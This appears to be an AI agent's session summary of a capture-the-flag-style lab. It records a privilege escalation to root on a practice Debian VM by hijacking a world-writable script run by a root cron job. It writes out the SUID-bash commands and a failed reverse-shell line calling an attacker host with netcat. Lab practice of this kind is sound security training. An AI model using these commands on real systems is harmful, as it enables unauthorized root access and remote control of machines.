thread_id: 01902002-6da4-7dbd-a53a-01a0436c8515
updated_at: 2026-06-21T00:51:43+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\06\21\rollout-2026-06-21T08-11-43-01902002-6da4-7dbd-a53a-01a0436c8515.jsonl
cwd: \\?\C:\Workspace\pwn-lab

# Pivoted from `user` to root by hijacking a world-writable script invoked by a root cron job on a HTB-style VM.

Rollout context: cwd was `C:\Workspace\pwn-lab`, VM was HTB-style Debian 11. After foothold, `linpeas` flagged `/opt/backup/run.sh` as world-writable and referenced from `/etc/cron.d/backup`.

## Task 1: Cron-triggered writable-script hijack → root shell

Outcome: success

Preference signals:
- Chinese narration; shell in English.
- Short exploit — one added line to the script — was preferred over installing a full payload.

Key steps:
- Confirmed the cron entry: `cat /etc/cron.d/backup` → `*/2 * * * * root /opt/backup/run.sh`.
- Confirmed writability: `ls -la /opt/backup/run.sh` → world-writable.
- Appended: `chmod +s /bin/bash` to the script.
- Waited ~2 min for the cron cycle; `ls -la /bin/bash` showed the SUID bit set.
- `/bin/bash -p` → root shell.

Failures and how to do differently:
- First hijack appended `bash -c 'nc <attacker> 4444 -e /bin/sh'` — the target had no netcat with `-e` support. Switched to the SUID-bash trick which is offline / doesn't depend on outbound reachability.
- Waited 4 minutes before checking; cron was on 2-min schedule but the script's runtime was ~30s so first cycle happened at boot minute + 2. Adjusted the wait.

Reusable knowledge:
- The "SUID /bin/bash" primitive is the offline-safe pivot when you have write-to-root-script — no reverse-shell dependency, no outbound net needed.
- After exercise, restore the script and remove `chmod +s /bin/bash` (leaving a SUID bash on a box is a huge tell in a real assessment).
- Cron cycle timing: floor to the nearest slot after modification (`*/2` means 0/2/4/... minute).

References:
- [1] linpeas output flagged the world-writable file
- [2] Target VM: HTB-style Debian 11
